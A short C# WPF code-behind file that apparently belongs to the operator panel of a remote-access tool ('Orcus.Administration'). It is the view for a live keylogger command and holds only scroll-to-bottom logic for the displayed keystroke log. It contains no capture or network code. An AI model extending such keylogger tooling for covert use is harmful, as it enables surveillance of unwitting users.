using System;
using System.Windows;
using System.Windows.Controls;
using Orcus.Administration.Utilities;
using Orcus.Administration.ViewModels.CommandViewModels;

namespace Orcus.Administration.Views.CommandViews
{
    /// <summary>
    ///     Interaction logic for LiveKeyloggerCommandView.xaml
    /// </summary>
    public partial class LiveKeyloggerCommandView
    {
        private ScrollViewer _scrollViewer;

        public LiveKeyloggerCommandView()
        {
            InitializeComponent();
            Loaded += OnLoaded;
        }

        private void OnLoaded(object sender, RoutedEventArgs routedEventArgs)
        {
            Loaded -= OnLoaded;
            var itemsControl = WpfExtensions.FindChild<ItemsControl>(KeyLogView, null);
            _scrollViewer = WpfExtensions.FindChild<ScrollViewer>(itemsControl, null);
            ((LiveKeyloggerViewModel)DataContext).ViewUpdated += OnViewUpdated;
        }

        private void OnViewUpdated(object sender, EventArgs eventArgs)
        {
            _scrollViewer.ScrollToBottom();
        }
    }
}